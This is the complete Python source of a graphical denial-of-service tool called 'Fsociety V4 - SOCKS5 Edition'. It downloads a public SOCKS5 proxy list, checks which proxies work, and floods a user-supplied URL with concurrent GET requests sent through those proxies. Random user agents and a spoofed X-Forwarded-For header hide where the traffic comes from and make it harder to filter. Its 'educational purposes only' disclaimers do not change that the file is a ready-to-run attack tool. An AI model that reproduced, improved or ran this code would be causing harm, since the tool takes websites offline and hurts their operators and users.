import sys
import requests
import asyncio
import aiohttp
import random
import itertools
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox, QTextEdit, QProgressBar
)
from PyQt5.QtGui import QPixmap
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from io import BytesIO

try:
    import aiohttp_socks
except ImportError:
    print("Please install aiohttp-socks: pip install aiohttp-socks")
    sys.exit(1)

# Legal disclaimer
print("WARNING: This tool is for educational purposes only.")
print("Unauthorized use for attacking targets without permission is illegal.")
print("The developer assumes no liability for misuse of this software.")

UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0"
]

PROXY_LIST_URL = "https://raw.githubusercontent.com/ebrasha/abdal-proxy-hub/refs/heads/main/socks5-proxy-list-by-EbraSha.txt"

class AttackThread(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    finished_signal = pyqtSignal()

    def __init__(self, target_url, num_requests):
        super().__init__()
        self.target_url = target_url
        self.num_requests = num_requests
        self.is_running = True

    async def fetch_proxies(self):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(PROXY_LIST_URL, timeout=10) as response:
                    if response.status == 200:
                        text = await response.text()
                        proxies = [line.strip() for line in text.splitlines() if line.strip() and ':' in line]
                        self.log_signal.emit(f"Fetched {len(proxies)} SOCKS5 proxies.")
                        return proxies
                    else:
                        self.log_signal.emit(f"Failed to fetch proxies: Status {response.status}")
                        return []
            except Exception as e:
                self.log_signal.emit(f"Error fetching proxies: {str(e)}")
                return []

    async def test_proxy(self, session, proxy):
        try:
            proxy_url = f"socks5://{proxy}"
            async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=5) as response:
                if response.status == 200:
                    return proxy
        except Exception:
            pass
        return None

    async def get_working_proxies(self):
        proxies = await self.fetch_proxies()
        if not proxies:
            return []
        async with aiohttp.ClientSession() as session:
            tasks = [self.test_proxy(session, proxy) for proxy in proxies]
            results = await asyncio.gather(*tasks)
            working_proxies = [p for p in results if p is not None]
            self.log_signal.emit(f"Found {len(working_proxies)} working SOCKS5 proxies.")
            return working_proxies

    async def send_request(self, session, proxy, semaphore):
        if not self.is_running:
            return
        async with semaphore:
            proxy_url = f"socks5://{proxy}"
            headers = {
                "User-Agent": random.choice(UserAgents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "X-Forwarded-For": proxy.split(':')[0],
            }
            try:
                async with session.get(self.target_url, headers=headers, proxy=proxy_url, timeout=10) as response:
                    status = response.status
                    self.log_signal.emit(f"Attack on {self.target_url} via {proxy} - Status: {status}")
            except Exception as e:
                self.log_signal.emit(f"Error sending request via {proxy}: {str(e)}")

    async def attack(self):
        working_proxies = await self.get_working_proxies()
        if not working_proxies:
            self.log_signal.emit("No working proxies found. Aborting attack.")
            return
        proxy_cycle = itertools.cycle(working_proxies)
        semaphore = asyncio.Semaphore(100)
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(self.num_requests):
                if not self.is_running:
                    break
                proxy = next(proxy_cycle)
                tasks.append(self.send_request(session, proxy, semaphore))
                if len(tasks) >= 100:
                    await asyncio.gather(*tasks)
                    tasks = []
                    self.progress_signal.emit(int((i / self.num_requests) * 100))
            if tasks:
                await asyncio.gather(*tasks)
            self.progress_signal.emit(100)

    def run(self):
        asyncio.run(self.attack())
        self.finished_signal.emit()

    def stop(self):
        self.is_running = False

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety V4 - SOCKS5 Edition")
        self.setGeometry(200, 200, 600, 600)
        self.setStyleSheet("background-color: #191919; color: white;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        layout = QVBoxLayout()

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background-color:#191919; color: red;")
        layout.addWidget(self.log_output)

        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("background-color: #191919;")
        layout.addWidget(self.image_label)
        
        image_url = "https://i.pinimg.com/736x/30/b9/46/30b94658f685ffd183c8c442d2973d30.jpg"
        self.load_image(image_url)

        self.url_label = QLabel("Target URL:")
        self.url_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.url_label, alignment=Qt.AlignCenter)

        self.url_input = QLineEdit()
        self.url_input.setFixedWidth(300)
        self.url_input.setPlaceholderText("http://example.com")
        layout.addWidget(self.url_input, alignment=Qt.AlignCenter)

        self.requests_label = QLabel("Number of Requests:")
        self.requests_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.requests_label)

        self.requests_input = QLineEdit()
        self.requests_input.setFixedWidth(300)
        self.requests_input.setPlaceholderText("e.g., 1000")
        layout.addWidget(self.requests_input, alignment=Qt.AlignCenter)

        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("QProgressBar { background-color: #333; color: white; }")
        layout.addWidget(self.progress_bar)

        button_layout = QVBoxLayout()
        self.start_button = QPushButton("Start Attack")
        self.start_button.setFixedWidth(150)
        self.start_button.clicked.connect(self.start_attack)
        self.start_button.setStyleSheet("""
            QPushButton {
                background-color: #d9534f;
                color: white;
                border-radius: 5px;
                padding: 8px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #c9302c;
            }
        """)
        button_layout.addWidget(self.start_button, alignment=Qt.AlignCenter)

        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.setFixedWidth(150)
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setStyleSheet("""
            QPushButton {
                background-color: #5bc0de;
                color: white;
                border-radius: 5px;
                padding: 8px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #46b8da;
            }
        """)
        self.stop_button.setEnabled(False)
        button_layout.addWidget(self.stop_button, alignment=Qt.AlignCenter)

        layout.addLayout(button_layout)

        disclaimer = QLabel("WARNING: For educational purposes only. Unauthorized use is illegal.")
        disclaimer.setAlignment(Qt.AlignCenter)
        disclaimer.setStyleSheet("color: #f0ad4e; font-size: 10px;")
        layout.addWidget(disclaimer)

        central_widget.setLayout(layout)

        self.attack_thread = None

    def log_message(self, message):
        self.log_output.append(message)
        self.log_output.ensureCursorVisible()

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def load_image(self, image_url):
        try:
            response = requests.get(image_url)
            response.raise_for_status()
            pixmap = QPixmap()
            pixmap.loadFromData(BytesIO(response.content).getvalue())
            self.image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio))
        except Exception as e:
            self.log_message(f"Error loading image: {e}")

    def start_attack(self):
        target_url = self.url_input.text()
        if not target_url.startswith(('http://', 'https://')):
            QMessageBox.critical(self, "Invalid URL", "URL must start with http:// or https://")
            return
        try:
            num_requests = int(self.requests_input.text())
            if num_requests <= 0:
                raise ValueError
        except ValueError:
            QMessageBox.critical(self, "Invalid Input", "Number of requests must be a positive integer.")
            return

        self.log_message("DDoS attack started.")
        self.progress_bar.setValue(0)
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.progress_signal.connect(self.update_progress)
        self.attack_thread.finished_signal.connect(self.attack_finished)
        self.attack_thread.start()

    def stop_attack(self):
        if self.attack_thread:
            self.attack_thread.stop()
            self.log_message("Stopping attack...")
        self.stop_button.setEnabled(False)

    def attack_finished(self):
        self.log_message("Attack finished.")
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

    def closeEvent(self, event):
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
